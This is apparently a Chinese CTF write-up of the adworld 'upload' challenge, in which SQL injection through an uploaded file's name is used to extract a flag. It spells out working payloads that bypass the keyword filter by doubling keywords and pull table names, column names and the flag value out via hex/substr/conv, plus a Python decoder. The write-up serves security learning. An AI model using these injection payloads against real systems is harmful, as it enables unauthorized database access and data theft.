# upload

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=cf7ad2aa-422b-49fa-8799-786a6fd70d1a_2)

这算哪门子upload？这是什么神奇的sql注入？

网页要求注册。因为题目是upload我就没想着在注册框测试sql注入。注册完成后来到一个文件上传页面。文件只能上传jpg后缀，jpeg都不行。传上去后就可以发现和想象中的upload不一样：是不是忘了给路径了？

接着持续懵逼。我要干啥？看了[wp](https://blog.csdn.net/weixin_42499640/article/details/96041817)，不是吧sql怎么阴魂不散啊，文件名也能注入？遂又看了一个[wp](https://article.itxueyuan.com/EeJq15)。

注入肯定先从select database()开始测试一下。结果把文件名改成sql语句后select不见了。那可能是置空过滤。这种过滤很容易就能绕过，双写完事。然后猜闭合。大佬们猜出了后台可能的代码。

- insert into 表名('filename',...) values('你上传的文件名',...);

所以是单引号闭合。闭合后sql注入的语句会被拼接到上传的文件名中。构造payload。

- '+seselectlect database()+'.jpg

但是回显文件名是0。可能是查询的内容里不能有字母。可以转成16进制，用hex函数。不对，16进制也有字母，那再把16进制转成10进制。转换进制用[CONV](https://blog.csdn.net/geming2017/article/details/84256843#:~:text=MySQL%20CONV%EF%BC%88%EF%BC%89%E5%B0%86%E4%B8%80%E4%B8%AA%E6%95%B0%E5%AD%97,%E8%A7%86%E4%B8%BA%E5%B8%A6%E7%AC%A6%E5%8F%B7%E6%95%B0%E3%80%82)函数。

- '+(selselectect conv(hex(database()),16,10))+'.jpg 

……为什么是科学计数法。再看看wp，原来超过12位的数字就会被转为科学计数法。那我们用substr每次截取12位就得了。知道关键点hex(),substr()和conv()后就可以随意构造payload了。

- 查表
  > '+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = database() limit 1,1)),1,12),16,10))+'.jpg<br>'+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = database() limit 1,1)),13,12),16,10))+'.jpg<br>'+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = database() limit 1,1)),25,12),16,10))+'.jpg

库懒得查了，之前只是个测试。查得表名为hello_flag_is_here。

- 查字段
  > '+(seleselectct+CONV(substr(hex((seleselectct COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME='hello_flag_i_here' limit 0,1)),1,12),16,10))+'.jpg<br>'+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 0,1)),13,12),16,10))+'.jpg

from也被过滤了，继续双写绕过。得到字段名为i_am_flag。

- 爆字段值
  > '+CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10)+'.jpg<br>'+CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10)+'.jpg<br>'+CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10)+'.jpg

把字段值的内容拼接起来就是flag。

```python
data=[36427215695199,92806431727430,560750951]
for i in data:
    print(bytes.fromhex(hex(i)[2:]).decode(),end='')
```

- ### Flag
  > !!_@m_Th.e_F!lag